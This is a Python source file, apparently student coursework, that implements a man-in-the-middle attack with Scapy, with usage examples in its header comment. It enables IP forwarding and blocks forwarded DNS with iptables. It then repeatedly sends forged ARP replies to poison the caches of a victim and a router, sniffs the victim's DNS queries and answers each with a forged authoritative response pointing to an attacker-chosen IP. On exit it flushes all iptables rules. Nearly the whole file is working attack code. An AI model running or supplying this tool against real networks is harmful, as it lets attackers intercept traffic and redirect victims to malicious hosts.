'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  SOURCE FILE:    main.py
--
--  AUTHOR:         Jason Soukchamroeun (A00895711)
--
--  PROGRAM:        Proof of concept application for arp poisoning and
--                  DNS spoofing. Application acts as MITM sniffer 
--                  for DNS traffic and injects crafted DNS responses
--                  when a query is intercepted.
--
--  FUNCTIONS:      parse_arguments, victimMacAddress, routerMacAddress, ownMacAddress 
--					forwarding, arpPoison, sniffDNS, spoofDNS
--
--  NOTES:
--  The program requires the Scapy library for packet crafting.
--
--
--	USAGE:
--	python3 main.py -v [Victim IP] -r [Router IP] -i [own machine's IP]
--					   -g [IP of the target website]
--	Example Usage:
--	python3 main.py -v 10.0.0.10 -r 10.0.0.1 -i 10.0.0.12
--					   -g 10.0.0.23
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
from scapy.all import *
from subprocess import Popen, PIPE
from multiprocessing import Process
import argparse
import re
import time

from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import ARP, Ether

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	parse_arguments
--
--  Parameters:	None
--
--  Return Values:	None
--
--  Description:
--      The arguments needed to run the program.
--		Doing python "main.py -h" will show the parameters that are allowed
--
--	Usage:
--	python3 main.py -v 10.0.0.10 -r 10.0.0.1 -i 10.0.0.12
--					   -g 10.0.0.23
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--victimIP", help="victim IP address")
    parser.add_argument("-r", "--routerIP", help="router IP address")
    parser.add_argument("-i", "--ownIP", help="This machine's IP address")
    parser.add_argument("-g", "--gotoIP", help="Redirected Machine's IP address")
    return parser.parse_args()


'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	victimMacAddress()
--
--  Parameters:	victim
--
--  Return Values:	victimMac
--
--  Description:
--      Gets the MAC address of the victim's IP address
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def victimMacAddress(victim):
    ip = victim
    Popen(["ping", "-c 1", ip], stdout=PIPE)
    pid = Popen(["arp", "-n", ip], stdout=PIPE)
    result = bytes.decode(pid.communicate()[0])
    if result:
        victimMac = re.search(r"(([a-f\d]{1,2}:){5}[a-f\d]{1,2})", result).groups()[0]
        return victimMac
    else:
        print(result)


'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	routerMacAddress()
--
--  Parameters:	router
--
--  Return Values:	routerMac
--
--  Description:
--      Gets the MAC address of the router's IP address
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def routerMacAddress(router):
    ip = router
    Popen(["ping", "-c 1", ip], stdout=PIPE)
    pid = Popen(["arp", "-n", ip], stdout=PIPE)
    result = bytes.decode(pid.communicate()[0])
    if result:
        routerMac = re.search(r"(([a-f\d]{1,2}:){5}[a-f\d]{1,2})", result).groups()[0]
        return routerMac
    else:
        print(result)


'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	ownMacAddress()
--
--  Parameters:	None
--
--  Return Values:	myMac
--
--  Description:
--      Gets the MAC address of our own machine
--      Used for testing
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def ownMacAddress():
    arppkt = ARP()
    myMac = arppkt[ARP].hwsrc
    return myMac


'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	forwarding()
--
--  Parameters:	None
--
--  Return Values:	None
--
--  Description:
--      Enables IP forwarding so that packets from the victim will be forwarded.
--		Add firewall rule to drop UDP packets going to dport 53 in the FORWARD
--		chain.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def forwarding():
    # write "1" into /proc/sys/net/ipv4/ip_forward
    ipforward = "echo \"1\" >> /proc/sys/net/ipv4/ip_forward"
    Popen([ipforward], shell=True, stdout=PIPE)

    # Firewall rule, disable forwarding of any UDP packets to dport 53
    firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP"
    Popen([firewall], shell=True, stdout=PIPE)


'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	arpPoison()
--
--  Parameters:	victim, router
--
--  Return Values:	None
--
--  Description:
--      Send ARP packets to both the victim and the router every 2 seconds.
--		State that the router is at the attacker machine to the victim +
--		State that the victim machine is at the attacker machine to the router.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def arpPoison(victim, router):
    # IP and MAC addresses
    victimIP = victim
    routerIP = router
    victimMac = victimMacAddress(victimIP)
    routerMac = routerMacAddress(routerIP)
    print("Starting ARP poisoning to victim " + victimIP + " and router " + routerIP)
    while True:
        time.sleep(2)
        # 3A Repeatedly send ARP reply's to VICTIM stating that router IP
        # is at THIS MAC addr
        send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMac), verbose=0)
        # 3B Repeatedly send ARP reply's to ROUTER stating that the victim IP
        # is at THIS MAC
        send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMac), verbose=0)


'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	sniffDNS()
--
--  Parameters:	victimIP,routerIP,ownIP,gotoIP
--
--  Return Values:	None
--
--  Description:
--      Sniff for traffic on udp, port 53 (DNS) and the victim. 
--		Send packet to the spoofDNS function where each packets are handled.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def sniffDNS(victimIP, routerIP, ownIP, gotoIP):
    sniff(filter="udp and port 53 and host " + victimIP, prn=spoofDNS)


'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	spoofDNS()
--
--  Parameters:	packet
--
--  Return Values:	None
--
--  Description:
--      Checks if the victim had sent for a DNSQR then craft a response.
--		Send response for each DNSQR that the victim has.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def spoofDNS(packet):
    # Checks if the source IP of the packet is the victim
    if packet[IP].src == victimIP:
        # Checks if it is a DNS packet
        if packet.haslayer(DNS):
            # Checks if the packet is a DNS query
            if DNSQR in packet:
                # Send back a spoofed packet
                spoofed_pkt = (Ether() / IP(dst=packet[IP].src, src=packet[IP].dst) /
                               UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /
                               DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1,
                                   an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=gotoIP)))
                sendp(spoofed_pkt, count=1)


# Global
if __name__ == '__main__':
    try:
        # Grab all the arguments and store into variables
        arguments = parse_arguments()
        victimIP = arguments.victimIP
        routerIP = arguments.routerIP
        ownIP = arguments.ownIP
        gotoIP = arguments.gotoIP

        # enable forwarding and the firewall
        forwarding()

        # Create two processes for the arp poison and for sniffing the traffic
        arpPoisonProcess = Process(target=arpPoison, args=(victimIP, routerIP))
        arpPoisonProcess.start()

        sniffDNSprocess = Process(target=sniffDNS, args=(victimIP, routerIP, ownIP, gotoIP))
        sniffDNSprocess.start()

        arpPoisonProcess.join()
        sniffDNSprocess.join()
    except KeyboardInterrupt:
        # write "0" into /proc/sys/net/ipv4/ip_forward
        ipforward = "echo \"0\" >> /proc/sys/net/ipv4/ip_forward"
        Popen([ipforward], shell=True, stdout=PIPE)

        # Firewall rule, disable any established rules
        firewall = "iptables --flush"
        Popen([firewall], shell=True, stdout=PIPE)

        print("Program closed.")


